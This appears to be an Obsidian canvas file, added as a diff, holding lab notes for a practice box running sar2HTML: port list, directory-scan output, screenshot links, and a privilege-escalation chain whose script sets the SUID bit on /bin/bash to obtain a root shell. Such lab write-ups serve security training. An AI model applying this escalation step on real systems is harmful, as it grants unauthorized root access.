@@ -1,0 +1,40 @@
+{
+	"nodes":[
+		{"id":"33515760e62cda59","type":"group","x":320,"y":-320,"width":290,"height":197,"label":"TCP - open"},
+		{"id":"5653e99f83f3f8b4","type":"text","text":"# TARGET","x":-48,"y":-225,"width":250,"height":60},
+		{"id":"e36b6de9fe0e3f79","type":"text","text":"## nmap\n```\n\n\n```","x":-535,"y":-83,"width":515,"height":763},
+		{"id":"6e88697db13577e3","type":"text","text":"port 22","x":340,"y":-289,"width":250,"height":60},
+		{"id":"6ab5645d20d92f6e","type":"text","text":"port 80","x":340,"y":-203,"width":250,"height":60},
+		{"id":"5bf90dc7643021dd","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260721234850.png","x":820,"y":-173,"width":518,"height":180},
+		{"id":"2c3d7b54e590d64d","type":"text","text":"```\n/.hta           (Status: 403) [Size: 279]  \n/.htaccess      (Status: 403) [Size: 279]  \n/.htpasswd      (Status: 403) [Size: 279]  \n/index.html     (Status: 200) [Size: 10918]  \n/phpinfo.php    (Status: 200) [Size: 95418]  \n/robots.txt     (Status: 200) [Size: 9]  \n/server-status  (Status: 403) [Size: 279]\n\n┌─────────────────┬────────┬──────────────────────────────────────────┐  \n│ Path            │ Status │ Notes                                    │  \n├─────────────────┼────────┼──────────────────────────────────────────┤  \n│ /phpinfo.php    │ 200    │ Full PHP config exposed — never good     │  \n│ /robots.txt     │ 200    │ Small file, with sar2HTML      \n│ /index.html     │ 200    │ Default Apache page, nothing useful      │  \n│ /.htaccess      │ 403    │ Exists but unreadable                    │  \n└─────────────────┴────────┴──────────────────────────────────────────┘\n```","x":77,"y":7,"width":717,"height":453},
+		{"id":"55ab5cf04385ef40","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260722001813.png","x":1580,"y":-124,"width":492,"height":50},
+		{"id":"7a9d9d33409c53bf","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260722001831.png","x":1280,"y":120,"width":1029,"height":160},
+		{"id":"833443de818498d5","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260722001858.png","x":2271,"y":-173,"width":1513,"height":99},
+		{"id":"fb03ed2c6ac1cbba","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260722001925.png","x":3140,"y":60,"width":730,"height":300},
+		{"id":"4e256ff39973fd88","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260722002028.png","x":3180,"y":560,"width":539,"height":180},
+		{"id":"3975862fd5d35e5b","type":"text","text":"```\ncat write.sh\n#!/bin/sh\ntouch /tmp/gateway\n\n./write.sh\n```","x":3200,"y":940,"width":425,"height":160},
+		{"id":"592955783fcb9d00","type":"text","text":"```\ncat << 'EOF' > finally.sh\n#!/bin/sh\nchmod +s /bin/bash\nEOF\nchmod +x finally.sh\n```","x":3820,"y":940,"width":378,"height":167},
+		{"id":"ab56f560f57323e7","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260722002339.png","x":3413,"y":1320,"width":568,"height":200},
+		{"id":"16d4ef8e059830b7","type":"text","text":"```\n/var/www/html$ while true; do ls -la /bin/bash; sleep 5; done\n```","x":3413,"y":1580,"width":647,"height":65},
+		{"id":"1d8e8b974f95cc2a","type":"text","text":"# SHELL","x":3594,"y":1705,"width":250,"height":60,"color":"1"},
+		{"id":"085bf0fdf57da309","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260722002512.png","x":3430,"y":1860,"width":579,"height":200}
+	],
+	"edges":[
+		{"id":"5d096c84a35534fd","fromNode":"5653e99f83f3f8b4","fromSide":"bottom","toNode":"e36b6de9fe0e3f79","toSide":"top"},
+		{"id":"7062e70298128481","fromNode":"6ab5645d20d92f6e","fromSide":"right","toNode":"5bf90dc7643021dd","toSide":"left"},
+		{"id":"891614bb84cf5610","fromNode":"5653e99f83f3f8b4","fromSide":"right","toNode":"33515760e62cda59","toSide":"left"},
+		{"id":"9ca0ee6af6468f11","fromNode":"6ab5645d20d92f6e","fromSide":"bottom","toNode":"2c3d7b54e590d64d","toSide":"top"},
+		{"id":"3941b8f8c5f590d7","fromNode":"5bf90dc7643021dd","fromSide":"right","toNode":"55ab5cf04385ef40","toSide":"left"},
+		{"id":"b84696b7aab60818","fromNode":"55ab5cf04385ef40","fromSide":"bottom","toNode":"7a9d9d33409c53bf","toSide":"top","label":"output"},
+		{"id":"2436581bdb59bffe","fromNode":"55ab5cf04385ef40","fromSide":"right","toNode":"833443de818498d5","toSide":"left"},
+		{"id":"fc09b74437558998","fromNode":"833443de818498d5","fromSide":"bottom","toNode":"fb03ed2c6ac1cbba","toSide":"top"},
+		{"id":"3f28f8895be53384","fromNode":"fb03ed2c6ac1cbba","fromSide":"bottom","toNode":"4e256ff39973fd88","toSide":"top","label":"with write permission"},
+		{"id":"cc04ea13e81d2ad0","fromNode":"4e256ff39973fd88","fromSide":"bottom","toNode":"3975862fd5d35e5b","toSide":"top"},
+		{"id":"4b32bdaac3a0ad2f","fromNode":"3975862fd5d35e5b","fromSide":"right","toNode":"592955783fcb9d00","toSide":"left"},
+		{"id":"3142439f4d581e39","fromNode":"3975862fd5d35e5b","fromSide":"bottom","toNode":"ab56f560f57323e7","toSide":"top"},
+		{"id":"495f0dd2b9f200d7","fromNode":"592955783fcb9d00","fromSide":"bottom","toNode":"ab56f560f57323e7","toSide":"top"},
+		{"id":"e28b088ea53136a9","fromNode":"ab56f560f57323e7","fromSide":"bottom","toNode":"16d4ef8e059830b7","toSide":"top"},
+		{"id":"6d36132127819365","fromNode":"1d8e8b974f95cc2a","fromSide":"bottom","toNode":"085bf0fdf57da309","toSide":"top"},
+		{"id":"5ee860b9c0452521","fromNode":"16d4ef8e059830b7","fromSide":"bottom","toNode":"1d8e8b974f95cc2a","toSide":"top"}
+	]
+}
